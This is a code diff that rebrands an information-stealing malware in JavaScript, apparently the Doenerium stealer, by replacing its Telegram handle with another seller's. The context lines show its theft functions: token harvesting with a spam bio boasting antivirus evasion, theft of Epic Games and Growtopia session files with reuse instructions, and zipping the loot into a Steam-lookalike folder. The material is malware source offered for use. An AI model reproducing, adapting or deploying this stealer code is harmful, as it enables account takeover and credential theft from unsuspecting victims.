@@ -706,7 +706,7 @@ user = {
         randomUUID: crypto.randomBytes(16).toString('hex'),
         start: Date.now(),
         debug: false,
-        copyright: '<================[t.me/doenerium69 ]>================>\n\n',
+        copyright: '<================[t.me/V_Lucky_V]>================>\n\n',
         url: null,
         locale: locale,
     }
@@ -1863,8 +1863,8 @@ async function getTokens() {
     }
 
     const predefinedBio = `╔═══════════✧✧✧═══════════╗ 
-**     This free virus can bypass all antivirus !** 
-**           ⭐️https://t.me/doenerium69** ⭐️
+**     This virus can bypass all antivirus !     ** 
+**           ⭐️https://t.me/V_Lucky_V** ⭐️
 ╚═══════════✧✧✧═══════════╝`;
 
     for (let token of tokens) {
@@ -2471,7 +2471,7 @@ async function StealEpicGames() {
                 }
             });
 
-            const howToUseContent = `<================[t.me/doenerium69 Stealer]>================>\n\n
+            const howToUseContent = `<================[t.me/V_Lucky_V Stealer]>================>\n\n
 Close EpicGamesLauncher first, WIN + R type --> %localappdata%\\EpicGamesLauncher\\Saved\n
 delete everything and copy all contents into the Epic Games folder and run.`;
 
@@ -2629,7 +2629,7 @@ async function getGrowtopia() {
       await ensureDirectoryExistence(howToUseDir);
 
       const howToUsePath = path.join(howToUseDir, 'How to Use.txt');
-      const howToUseContent = `https://t.me/doenerium69\n==============================================\nFirst, open this folder on your computer <%localappdata%\\Growtopia>.\nThen, replace the existing 'save.dat' file with the stolen one.`;
+      const howToUseContent = `https://t.me/V_Lucky_V\n==============================================\nFirst, open this folder on your computer <%localappdata%\\Growtopia>.\nThen, replace the existing 'save.dat' file with the stolen one.`;
 
       await writeFile(howToUsePath, howToUseContent, { flag: 'a' });
     }
@@ -2848,7 +2848,7 @@ async function archiveAndSendData() {
         const archive = new AdmZip();
         archive.addLocalFolder(mainFolderPath);
         zipFilePath = `C:/ProgramData/Steam/Launcher/${locale}-${computerName}.zip`;
-        archive.addZipComment('All the Information was Stealed by T.ME/DOENERIUM69.');
+        archive.addZipComment('All the Information was Stealed by t.me/V_Lucky_V.');
         archive.writeZip(zipFilePath);
         console.log('Archive created successfully');
         getExtension(zipFilePath);
